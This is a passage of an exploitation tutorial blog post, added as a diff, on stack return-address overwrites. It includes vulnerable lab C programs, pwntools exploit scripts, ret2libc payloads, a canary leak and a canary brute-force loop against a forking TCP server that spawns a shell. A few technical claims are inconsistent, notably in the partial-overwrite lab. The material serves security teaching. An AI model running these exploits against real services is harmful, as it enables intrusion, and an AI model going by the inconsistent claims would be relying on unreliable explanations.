@@ -1,0 +1,495 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Return Address Overwrite Owning the Instruction Pointer — dev null notes</title>
+        <meta name="description" content="This article is about that mechanism in full. Not just *that* it works, but *why* it works at the CPU level, what the compiler and OS do to stop you, and how to systematically defeat every layer. We&#x27;re going from `CALL`/`RET` mnemonics all the way to remote code execution on a hardened binary." />
+        <meta name="author" content="mr-dev-null" />
+        <meta name="keywords" content="pwn, c" />
+
+        <meta property="og:title" content="Return Address Overwrite Owning the Instruction Pointer" />
+        <meta property="og:description" content="This article is about that mechanism in full. Not just *that* it works, but *why* it works at the CPU level, what the compiler and OS do to stop you, and how to systematically defeat every layer. We&#x27;re going from `CALL`/`RET` mnemonics all the way to remote code execution on a hardened binary." />
+        <meta property="og:type" content="article" />
+        <meta property="og:url" content="https://mr-dev-null.github.io/pwn/return-address-overwrite-owning-the-instruction-pointer.html" />
+        <meta property="og:site_name" content="dev null notes" />
+        <meta property="article:published_time" content="2026-07-01" />
+        <meta property="article:author" content="mr-dev-null" />
+        <meta property="article:tag" content="pwn" /><meta property="article:tag" content="c" />
+
+        <meta name="twitter:card" content="summary" />
+        <meta name="twitter:title" content="Return Address Overwrite Owning the Instruction Pointer" />
+        <meta name="twitter:description" content="This article is about that mechanism in full. Not just *that* it works, but *why* it works at the CPU level, what the compiler and OS do to stop you, and how to systematically defeat every layer. We&#x27;re going from `CALL`/`RET` mnemonics all the way to remote code execution on a hardened binary." />
+
+        <link rel="canonical" href="https://mr-dev-null.github.io/pwn/return-address-overwrite-owning-the-instruction-pointer.html" />
+        <link rel="stylesheet" href="/style.css" />
+
+        <script type="application/ld+json">{"@context": "[https://schema.org](https://schema.org)", "@type": "BlogPosting", "headline": "Return Address Overwrite Owning the Instruction Pointer", "description": "This article is about that mechanism in full. Not just *that* it works, but *why* it works at the CPU level, what the compiler and OS do to stop you, and how to systematically defeat every layer. We're going from `CALL`/`RET` mnemonics all the way to remote code execution on a hardened binary.", "datePublished": "2026-07-01", "author": {"@type": "Person", "name": "mr-dev-null"}, "publisher": {"@type": "Person", "name": "mr-dev-null"}, "url": "https://mr-dev-null.github.io/pwn/return-address-overwrite-owning-the-instruction-pointer.html", "keywords": "pwn, c"}</script>
+    </head>
+    <body>
+        <div id="reading-progress"></div>
+        
+        <nav>
+            <a href="/index.html" class="logo">dev null notes</a>
+            <button class="nav-toggle" aria-expanded="false" aria-label="Toggle navigation">[menu]</button>
+            <div class="nav-links">
+                <a href="/pwn/index.html">pwn</a>
+                <a href="/re/index.html">re</a>
+                <a href="/programing/index.html">programing</a>
+                <a href="/mal/index.html">mal</a>
+                <a href="/web/index.html">web</a>
+                <a href="/index.html">home</a>
+                <a href="/about.html">about</a>
+            </div>
+        </nav>
+        <article>
+            <div class="article-header">
+                <span class="category">PWN</span>
+                <h1>Return Address Overwrite Owning the Instruction Pointer</h1>
+                <div class="meta">
+                    <span>July 01, 2026</span>
+                    <span>·</span>
+                    <span>20 min read</span>
+                    <span>·</span><span>#pwn · #c</span>
+                </div>
+            </div>
+
+            <div class="toc"><h4>Contents</h4><ol><li><a href="#introduction">Introduction</a></li><li><a href="#1-the-cpu-level-story-call-and-ret">1. The CPU-Level Story: CALL and RET</a></li><li><a href="#2-what-youre-actually-writing">2. What You&#x27;re Actually Writing</a></li><li><a href="#3-the-leave-instruction-and-sfp-corruption">3. The LEAVE Instruction and SFP Corruption</a></li><li><a href="#4-lab-1-surgical-overwrite-minimum-bytes">4. Lab 1 — Surgical Overwrite: Minimum Bytes</a></li><li><a href="#5-lab-2-partial-overwrite-12-bytes-only">5. Lab 2 — Partial Overwrite (1–2 bytes only)</a></li><li><a href="#6-lab-3-overwriting-on-32-bit-vs-64-bit-the-calling-convention-difference">6. Lab 3 — Overwriting on 32-bit vs 64-bit: The Calling Convention Difference</a></li><li><a href="#7-lab-4-network-service-exploiting-a-forking-server">7. Lab 4 — Network Service: Exploiting a Forking Server</a></li><li><a href="#8-hardening-the-target-the-canary-problem">8. Hardening the Target: The Canary Problem</a></li><li><a href="#9-validating-your-exploit-primitives-in-gdb">9. Validating Your Exploit Primitives in GDB</a></li><li><a href="#10-the-offset-is-wrong-systematic-diagnosis">10. The Offset Is Wrong: Systematic Diagnosis</a></li><li><a href="#11-putting-it-all-together-the-mental-model">11. Putting It All Together: The Mental Model</a></li></ol></div>
+
+            <div class="prose">
+                <h2 id="introduction">Introduction</h2>
+<p><em>by mrdevnull · binary exploitation series · part 2</em></p>
+<hr>
+<p>In part 1 we established the overflow primitive — write past a buffer, corrupt the stack. We used it to redirect execution, but we treated the return address as a black box: "overwrite it with the address you want." </p>
+<p>This article is about that mechanism in full. Not just <em>that</em> it works, but <em>why</em> it works at the CPU level, what the compiler and OS do to stop you, and how to systematically defeat every layer. We're going from <code>CALL</code>/<code>RET</code> mnemonics all the way to remote code execution on a hardened binary.</p>
+<hr>
+<h2 id="1-the-cpu-level-story-call-and-ret">1. The CPU-Level Story: CALL and RET</h2>
+<p>Everything starts with two instructions.</p>
+<p>When the CPU executes <code>CALL target</code>:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>1. RSP  -= 8                  ; grow stack down by 8
+2. [RSP] = RIP + len(CALL)    ; push next instruction&#x27;s address
+3. RIP  = target              ; jump to called function</code></pre></div>
+<p>The value pushed — the address of the instruction <em>after</em> the <code>CALL</code> — is the <strong>return address</strong>. It lives on the stack.</p>
+<p>When the CPU executes <code>RET</code>:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>1. RIP = [RSP]     ; pop 8 bytes from stack into instruction pointer
+2. RSP += 8        ; shrink stack up</code></pre></div>
+<p>That's it. <code>RET</code> is just a <code>POP RIP</code>. There is no authentication, no validation, no check that the value is sane. The CPU pops whatever bytes are at <code>[RSP]</code> and jumps there unconditionally.</p>
+<p>The attack surface is the 8 bytes at <code>[RSP]</code> at the moment <code>RET</code> executes. If you control those bytes, you control where the CPU goes next.</p>
+<p>Let's trace it through the full call chain:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>main() calls vuln()
+        │
+        ▼
+CALL vuln         ; pushes addr of next main instruction → ret_addr on stack
+─────────────────────────────────────────
+PUSH RBP          ; save main&#x27;s frame pointer (prologue)
+MOV  RBP, RSP     ; set our frame pointer
+SUB  RSP, 0x50    ; allocate locals (includes buf)
+...
+[buf lives here, at RBP-N]
+...
+LEAVE             ; epilogue: RSP = RBP, POP RBP
+RET               ; POP RIP ← this is your target</code></pre></div>
+<p>The stack at the moment <code>RET</code> fires in <code>vuln()</code>:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>┌────────────────────────────┐
+│  ...main&#x27;s frame...        │  ← high addresses
+├────────────────────────────┤
+│  ret_addr (8 bytes)        │  ← [RSP] at RET time — your target
+├────────────────────────────┤
+│  saved RBP (8 bytes)       │  ← overwritten second
+├────────────────────────────┤  ← RBP during vuln()
+│  local vars / buf          │  ← overwritten first
+└────────────────────────────┘  ← RSP during vuln() body</code></pre></div>
+<p>Write far enough past <code>buf</code>, corrupt <code>saved RBP</code>, then corrupt <code>ret_addr</code>. When <code>RET</code> fires, you own <code>RIP</code>.</p>
+<hr>
+<h2 id="2-what-youre-actually-writing">2. What You're Actually Writing</h2>
+<p>The return address is a 64-bit (8-byte) virtual address. On x86-64 Linux, the current canonical address space uses only <strong>48 bits</strong> — the upper 16 bits of any valid user-space address must be zero (addresses look like <code>0x00007fffffffe000</code>).</p>
+<p>This matters for two reasons:</p>
+<p><strong>Null bytes</strong>: the high two bytes of any valid user-space address are <code>\x00\x00</code>. If the vulnerability uses <code>strcpy</code>, <code>gets</code>, or any function that stops at a null byte, you can still exploit it because the null bytes are at the <strong>end</strong> of the little-endian address. <code>p64(0x00007ffff7a52290)</code> = <code>\x90\x22\xa5\xf7\xff\x7f\x00\x00</code> — the nulls are last, so they'll only terminate the string after you've written the full address.</p>
+<p><strong>Partial overwrites</strong>: if you can only overflow by a small number of bytes, you might only be able to overwrite the <strong>low bytes</strong> of the return address. With no PIE, the binary is always mapped at a fixed low address (<code>0x400000</code>), so a 2-byte partial overwrite can redirect into the binary without knowing any libc addresses. This technique becomes critical when leaks are unavailable.</p>
+<hr>
+<h2 id="3-the-leave-instruction-and-sfp-corruption">3. The LEAVE Instruction and SFP Corruption</h2>
+<p>Most articles say "overwrite 64 bytes of buffer + 8 bytes of saved RBP + 8 bytes of return address." But what <em>is</em> that saved RBP write doing?</p>
+<p><code>LEAVE</code> expands to:</p>
+<div class="code-wrapper"><div class="code-header"><span>asm</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>MOV RSP, RBP   ; restore stack pointer from frame pointer
+POP RBP        ; restore caller&#x27;s RBP from [RSP]</code></pre></div>
+<p>If you corrupt saved RBP, when <code>LEAVE</code> executes:</p>
+<ol><li><code>RSP = RBP</code> — fine, RSP is set from our (correct) RBP</li><li><code>POP RBP</code> — pops your corrupted value into RBP</li></ol>
+<p>Then <code>RET</code> pops the return address. So at <code>RET</code> time, RBP contains your corrupted value.</p>
+<p>This matters when you target the <strong>caller</strong>. After our <code>vuln()</code> returns to <code>main()</code>, main's RBP is now wrong. If main uses RBP to reference locals (<code>[rbp-0x10]</code>), those references now point at attacker-controlled memory. This is the basis of <strong>frame pointer overwrite</strong> exploits — a separate technique — but understanding it here prevents confusion about why your exploit corrupts memory you didn't intend to touch.</p>
+<p>For clean return address overwrites: corrupt saved RBP with any 8 bytes, then put your target address. The corrupted RBP only matters if you need to chain into the caller's frame.</p>
+<hr>
+<h2 id="4-lab-1-surgical-overwrite-minimum-bytes">4. Lab 1 — Surgical Overwrite: Minimum Bytes</h2>
+<p>Most tutorials overflow with 200 bytes of <code>&#x27;A&#x27;</code>. Real exploits are surgical. Let's do it with exactly the minimum number of bytes.</p>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>// lab_surgical.c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void backdoor(void) {
+    puts(&quot;[!] backdoor executed&quot;);
+    // simulate privileged action
+    FILE *f = fopen(&quot;/etc/passwd&quot;, &quot;r&quot;);
+    if (f) {
+        char line[128];
+        fgets(line, sizeof(line), f);
+        printf(&quot;first line: %s&quot;, line);
+        fclose(f);
+    }
+}
+
+void process(char *input) {
+    char buf[48];
+    strcpy(buf, input);   // no bounds check
+}
+
+int main(int argc, char **argv) {
+    if (argc &lt; 2) { puts(&quot;usage: ./lab &lt;input&gt;&quot;); return 1; }
+    process(argv[1]);
+    return 0;
+}</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gcc -o lab_surgical lab_surgical.c -fno-stack-protector -no-pie</code></pre></div>
+<p>Note: <code>strcpy</code> stops at null bytes — so we cannot have <code>\x00</code> in the middle of our payload. But as established, the high bytes of the address are null and they come <em>last</em> in little-endian, so we're fine.</p>
+<h3 id="finding-the-exact-layout">Finding the Exact Layout</h3>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gdb ./lab_surgical
+pwndbg&gt; disass process</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>   0x0000000000401176 &lt;+0&gt;:   push   rbp
+   0x0000000000401177 &lt;+1&gt;:   mov    rbp,rsp
+   0x000000000040117a &lt;+3&gt;:   sub    rsp,0x40       ← 0x40 = 64 bytes allocated
+   0x000000000040117e &lt;+7&gt;:   mov    QWORD PTR [rbp-0x38],rdi
+   0x0000000000401182 &lt;+11&gt;:  mov    rdx,QWORD PTR [rbp-0x38]
+   0x0000000000401186 &lt;+15&gt;:  lea    rax,[rbp-0x30]  ← buf is at rbp-0x30 (48 bytes from rbp)
+   0x000000000040118a &lt;+19&gt;:  mov    rsi,rdx
+   0x000000000040118d &lt;+20&gt;:  mov    rdi,rax
+   0x0000000000401190 &lt;+22&gt;:  call   0x401060 &lt;strcpy@plt&gt;
+   0x0000000000401195 &lt;+27&gt;:  nop
+   0x0000000000401196 &lt;+28&gt;:  leave
+   0x0000000000401197 &lt;+29&gt;:  ret</code></pre></div>
+<p><code>buf</code> is at <code>rbp-0x30</code> = 48 bytes below RBP. Offset to return address:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>48 (buf → RBP) + 8 (saved RBP) = 56 bytes</code></pre></div>
+<p>Confirm:</p>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; cyclic 100
+pwndbg&gt; run $(cyclic 100)
+# crash: RSP contains &#x27;iaaaaaaa&#x27; or similar
+pwndbg&gt; cyclic -l &lt;crashed_value&gt;
+# → 56</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>python3 -c &quot;
+from pwn import *
+elf = ELF(&#x27;./lab_surgical&#x27;)
+backdoor = elf.sym[&#x27;backdoor&#x27;]
+payload = b&#x27;A&#x27;*56 + p64(backdoor)
+import sys
+sys.stdout.buffer.write(payload)
+&quot; | xargs -0 ./lab_surgical</code></pre></div>
+<p>Or as a clean script:</p>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># exploit_surgical.py
+from pwn import *
+import subprocess
+
+elf      = ELF(&#x27;./lab_surgical&#x27;)
+offset   = 56
+target   = elf.sym[&#x27;backdoor&#x27;]
+
+payload  = b&#x27;A&#x27; * offset + p64(target)
+
+# Pass as argv[1]
+result = subprocess.run(
+    [&#x27;./lab_surgical&#x27;, payload],
+    capture_output=True
+)
+print(result.stdout.decode())</code></pre></div>
+<hr>
+<h2 id="5-lab-2-partial-overwrite-12-bytes-only">5. Lab 2 — Partial Overwrite (1–2 bytes only)</h2>
+<p>Scenario: you can overflow by only <strong>2 bytes</strong> past the buffer end. Not enough to reach the return address fully. But with no PIE, the binary sits at <code>0x400000</code> — the low byte of any function in the binary is meaningful.</p>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>// lab_partial.c
+#include &lt;stdio.h&gt;
+
+void secret(void) {
+    puts(&quot;[*] you found the secret path&quot;);
+}
+
+void vuln(void) {
+    char buf[32];
+    read(0, buf, 34);   // exactly 2 bytes past buffer end
+}
+
+int main(void) {
+    vuln();
+    return 0;
+}</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gcc -o lab_partial lab_partial.c -fno-stack-protector -no-pie</code></pre></div>
+<p>The stack layout during <code>vuln()</code>:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>[rbp-0x20]  buf[0..31]      (32 bytes)
+[rbp+0x00]  saved RBP       (8 bytes)
+[rbp+0x08]  return address  (8 bytes)</code></pre></div>
+<p>We can write only 34 bytes: 32 fill the buffer, 2 bytes overwrite the <em>bottom 2 bytes of saved RBP</em>. The return address is untouched.</p>
+<p>Saved RBP corruption → when <code>main()</code> uses its (now corrupted) RBP after <code>vuln()</code> returns... but wait, can we do better?</p>
+<p>Let me show the more interesting case: <strong>partial return address overwrite when the overflow reaches it by 1–2 bytes</strong>.</p>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>// lab_partial2.c — overflow reaches ret addr by 2 bytes
+void vuln(void) {
+    char buf[32];
+    read(0, buf, 42);  // 32 buf + 8 saved RBP + 2 bytes into ret addr
+}</code></pre></div>
+<p>The return address in <code>main()</code> looks like <code>0x00007ffff7xxxxxx</code>. The low 2 bytes we can overwrite redirect within a 64KB window of <code>main</code>'s return. Since no PIE means the binary's text segment starts at <code>0x401000</code>, and <code>secret()</code> is also in the binary:</p>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># exploit_partial.py
+from pwn import *
+
+elf    = ELF(&#x27;./lab_partial2&#x27;)
+p      = process(&#x27;./lab_partial2&#x27;)
+
+secret = elf.sym[&#x27;secret&#x27;]
+log.info(f&quot;secret @ {hex(secret)}&quot;)
+
+# Overwrite only the low 2 bytes of the return address
+# Full return address is something like 0x00007ffff7de2xxx
+# We overwrite with the low 2 bytes of secret()
+low2 = p16(secret &amp; 0xffff)
+
+payload = b&#x27;A&#x27; * 40 + low2   # 32 buf + 8 saved rbp + 2 bytes
+
+p.send(payload)
+p.interactive()</code></pre></div>
+<p>This only works when <code>secret()</code> and the original return address share the same upper 6 bytes — guaranteed when both are in the same binary with no PIE.</p>
+<hr>
+<h2 id="6-lab-3-overwriting-on-32-bit-vs-64-bit-the-calling-convention-difference">6. Lab 3 — Overwriting on 32-bit vs 64-bit: The Calling Convention Difference</h2>
+<p>Return address overwrite works on both architectures, but the mechanics differ in one important way: <strong>argument passing</strong>.</p>
+<p>On <strong>x86 (32-bit)</strong>, arguments are passed on the stack, <em>after</em> the return address:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>[ESP+0x00]  return address
+[ESP+0x04]  arg1
+[ESP+0x08]  arg2</code></pre></div>
+<p>So to call <code>system(&quot;/bin/sh&quot;)</code> on 32-bit, your payload looks like:</p>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>payload = b&#x27;A&#x27; * offset
+payload += p32(system)       # return address → jump to system()
+payload += p32(0xdeadbeef)   # system()&#x27;s fake return address (don&#x27;t care)
+payload += p32(bin_sh)       # system()&#x27;s first argument</code></pre></div>
+<p>On <strong>x86-64</strong>, arguments go in registers (<code>RDI</code>, <code>RSI</code>, <code>RDX</code>, ...). You need a ROP gadget to load them before calling <code>system()</code>. That's why the <code>pop rdi; ret</code> pattern from part 1 is necessary.</p>
+<p>This distinction is the single biggest source of confusion when moving between 32-bit and 64-bit CTF challenges. Know which ABI you're targeting before building any payload.</p>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># compile 32-bit
+gcc -o lab32 lab.c -m32 -fno-stack-protector -no-pie -z execstack
+
+# check
+file lab32
+# lab32: ELF 32-bit LSB executable</code></pre></div>
+<p>32-bit exploit for ret2win:</p>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>from pwn import *
+
+elf    = ELF(&#x27;./lab32&#x27;)
+p      = process(&#x27;./lab32&#x27;)
+offset = 76   # typically 4 bytes larger alignment on 32-bit
+
+win = elf.sym[&#x27;win&#x27;]
+
+payload = flat(
+    b&#x27;A&#x27; * offset,
+    p32(win)         # just the address, no gadget needed
+)
+p.sendlineafter(b&#x27;input: &#x27;, payload)
+p.interactive()</code></pre></div>
+<p>32-bit ret2libc (argument on stack):</p>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>payload = flat(
+    b&#x27;A&#x27; * offset,
+    p32(system),
+    p32(0x41414141),   # return addr from system (crash is fine)
+    p32(bin_sh),
+)</code></pre></div>
+<hr>
+<h2 id="7-lab-4-network-service-exploiting-a-forking-server">7. Lab 4 — Network Service: Exploiting a Forking Server</h2>
+<p>Real binaries aren't run from the command line and piped to. They're network services. This lab shows how to attack a forking TCP server — and why forking servers are especially exploitable.</p>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>// server.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+
+void win(void) {
+    // in real scenario: dup2 socket to stdin/stdout, then execve
+    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);
+}
+
+void handle(int fd) {
+    char buf[128];
+    char greeting[] = &quot;hello: &quot;;
+    write(fd, greeting, sizeof(greeting)-1);
+    read(fd, buf, 256);   // overflow
+    write(fd, &quot;ok\n&quot;, 3);
+}
+
+int main(void) {
+    int srv = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in addr = {
+        .sin_family = AF_INET,
+        .sin_port   = htons(4444),
+        .sin_addr.s_addr = INADDR_ANY
+    };
+    int opt = 1;
+    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &amp;opt, sizeof(opt));
+    bind(srv, (struct sockaddr*)&amp;addr, sizeof(addr));
+    listen(srv, 5);
+
+    while (1) {
+        int cli = accept(srv, NULL, NULL);
+        if (fork() == 0) {
+            close(srv);
+            handle(cli);
+            close(cli);
+            exit(0);
+        }
+        close(cli);
+    }
+}</code></pre></div>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gcc -o server server.c -fno-stack-protector -no-pie
+./server &amp;</code></pre></div>
+<p>Why forking helps the attacker: <strong>each child fork inherits the same address space layout as the parent</strong>. If ASLR is on, the parent was randomized once at startup — but every child has the same addresses. If you can crash a child and try again, you're brute-forcing against the same fixed address space, not a freshly randomized one. On 32-bit this is devastating (only 16 bits of entropy). On 64-bit you typically need a leak.</p>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># exploit_server.py
+from pwn import *
+
+HOST = &#x27;127.0.0.1&#x27;
+PORT = 4444
+
+elf    = ELF(&#x27;./server&#x27;)
+offset = 136   # 128 buf + 8 saved rbp
+
+win    = elf.sym[&#x27;win&#x27;]
+log.info(f&quot;win @ {hex(win)}&quot;)
+
+p = remote(HOST, PORT)
+
+p.recvuntil(b&#x27;hello: &#x27;)
+
+payload = flat(
+    b&#x27;A&#x27; * offset,
+    p64(win)
+)
+
+p.send(payload)
+p.interactive()</code></pre></div>
+<p>For a real reverse shell over the network socket, <code>win()</code> needs to connect the socket fd to stdin/stdout/stderr first:</p>
+<div class="code-wrapper"><div class="code-header"><span>c</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>void win(int fd) {
+    dup2(fd, 0);   // stdin  → socket
+    dup2(fd, 1);   // stdout → socket
+    dup2(fd, 2);   // stderr → socket
+    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);
+}</code></pre></div>
+<p>In the ROP chain, you'd set <code>RDI = fd</code> (the socket file descriptor, typically 4 or 5 in a simple server) before calling <code>win</code>.</p>
+<hr>
+<h2 id="8-hardening-the-target-the-canary-problem">8. Hardening the Target: The Canary Problem</h2>
+<p>So far: no canary. Let's enable it and see exactly what happens.</p>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>gcc -o lab_canary lab.c -no-pie   # canary ON by default</code></pre></div>
+<p>Dissassemble the prologue:</p>
+<div class="code-wrapper"><div class="code-header"><span>asm</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>push   rbp
+mov    rbp, rsp
+sub    rsp, 0x50
+mov    rax, QWORD PTR fs:0x28    ← read canary from TLS (Thread Local Storage)
+mov    QWORD PTR [rbp-0x8], rax  ← store canary just below saved RBP
+xor    eax, eax</code></pre></div>
+<p>And the epilogue:</p>
+<div class="code-wrapper"><div class="code-header"><span>asm</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>mov    rax, QWORD PTR [rbp-0x8]  ← load canary from stack
+xor    rax, QWORD PTR fs:0x28    ← XOR with original value
+je     &lt;ok&gt;                      ← if equal, continue
+call   __stack_chk_fail          ← else: terminate</code></pre></div>
+<p>The canary sits between your buffer and the return address:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>┌──────────────────────┐
+│  return address      │
+├──────────────────────┤
+│  saved RBP           │
+├──────────────────────┤
+│  canary (8 bytes)    │  ← must survive intact
+├──────────────────────┤
+│  buf[]               │
+└──────────────────────┘</code></pre></div>
+<p>A linear overflow from <code>buf</code> will trash the canary. The check fires, process dies. Three ways around it:</p>
+<h3 id="bypass-1-leak-the-canary-first">Bypass 1: Leak the Canary First</h3>
+<p>If you have a <strong>read primitive</strong> (format string, out-of-bounds read, another <code>printf</code> before the overflow), you can read the canary value and include it correctly in your payload.</p>
+<p>The canary on x86-64 always has a <strong>null byte as its lowest byte</strong> (the byte at the lowest address). This is intentional — it terminates C strings so <code>printf(&quot;%s&quot;)</code> can't leak it easily through string reads. But format string <code>%7$p</code> (direct parameter access) can still leak it as a pointer.</p>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># Hypothetical: leak via format string at offset 7 on the stack
+p.sendline(b&#x27;%7$p&#x27;)
+canary = int(p.recvline().strip(), 16)
+log.success(f&quot;canary: {hex(canary)}&quot;)
+
+# Now include it in overflow
+payload = flat(
+    b&#x27;A&#x27; * 56,
+    p64(canary),       # correct canary value
+    p64(0x4141414141414141),  # fake saved RBP
+    p64(win),          # return address
+)</code></pre></div>
+<h3 id="bypass-2-brute-force-32-bit-forking-servers">Bypass 2: Brute Force (32-bit forking servers)</h3>
+<p>On 32-bit, the canary is 4 bytes. The null byte is fixed, leaving 3 bytes = 16.7 million possibilities. On a <strong>forking</strong> server, the child inherits the parent's canary — same value every fork. You can brute force one byte at a time (256 tries per byte × 3 bytes = 768 maximum requests).</p>
+<div class="code-wrapper"><div class="code-header"><span>python</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>canary = b&#x27;\x00&#x27;    # first byte is always null
+for i in range(3):
+    for byte in range(256):
+        p = remote(HOST, PORT)
+        probe = b&#x27;A&#x27; * 64 + canary + bytes([byte])
+        p.send(probe)
+        response = p.recv()
+        if b&#x27;ok&#x27; in response:   # survived the canary check
+            canary += bytes([byte])
+            break
+        p.close()
+
+log.success(f&quot;canary: {canary.hex()}&quot;)</code></pre></div>
+<h3 id="bypass-3-out-of-bounds-read-before-overflow">Bypass 3: Out-of-Bounds Read Before Overflow</h3>
+<p>Some binaries let you read memory before writing. If you can index an array backwards, or if a struct has both a pointer and a buffer, you can read the canary directly off the stack. Once you have it, the overflow proceeds with the canary intact.</p>
+<hr>
+<h2 id="9-validating-your-exploit-primitives-in-gdb">9. Validating Your Exploit Primitives in GDB</h2>
+<p>The three checks before sending any payload to a real target:</p>
+<p><strong>Check 1: Does RIP contain your value?</strong></p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; run &lt; &lt;(python3 exploit.py)
+# on crash:
+pwndbg&gt; p/x $rip
+# should show your target address or 0x4141414141414141</code></pre></div>
+<p><strong>Check 2: Is the stack aligned?</strong></p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; p $rsp % 16
+# should be 0 when entering system() or any libc function using MOVAPS</code></pre></div>
+<p><strong>Check 3: Are your addresses correct?</strong></p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; x/gx &lt;address&gt;      # read 8 bytes at an address
+pwndbg&gt; info sym &lt;address&gt;   # what symbol is at this address?
+pwndbg&gt; p system             # runtime address of system()</code></pre></div>
+<p><strong>Check 4: Canary value when debugging</strong></p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>pwndbg&gt; p/x *(long long*)($rbp-8)   # read canary off stack mid-function</code></pre></div>
+<hr>
+<h2 id="10-the-offset-is-wrong-systematic-diagnosis">10. The Offset Is Wrong: Systematic Diagnosis</h2>
+<p>You ran the exploit and got a segfault at the wrong address, or no redirect at all. Here's the decision tree:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>Wrong address in RIP?
+├── RIP shows part of your &#x27;A&#x27; pattern
+│   └── offset is too large, reduce it
+├── RIP shows 0x0000414141414141 (partial overwrite)
+│   └── offset is too small by a few bytes
+├── RIP shows 0x00007f... (original return addr, unchanged)
+│   └── overflow didn&#x27;t reach return addr — increase input size
+├── SIGILL or jump to unmapped memory
+│   └── address is right, but it&#x27;s a bad instruction at that addr
+│       → check you&#x27;re jumping to function START not middle
+└── Process terminated cleanly (no crash)
+    └── canary check fired before RET — you need the canary</code></pre></div>
+<p>Misalignment by 8 bytes is the most common mistake. The compiler may add padding between the declared buffer size and the actual <code>SUB RSP</code> in the prologue. Always verify with <code>disass &lt;function&gt;</code> in GDB, not just the C source.</p>
+<div class="code-wrapper"><div class="code-header"><span>bash</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code># Source says buf[64] but compiler allocated:
+pwndbg&gt; disass vuln
+# sub rsp, 0x60    ← 96 bytes allocated, not 64
+# buf is at rbp-0x60, so offset = 0x60 + 8 = 104, not 72</code></pre></div>
+<p>This happens because the compiler aligns the frame to 16-byte boundaries and may add padding for local variable alignment.</p>
+<hr>
+<h2 id="11-putting-it-all-together-the-mental-model">11. Putting It All Together: The Mental Model</h2>
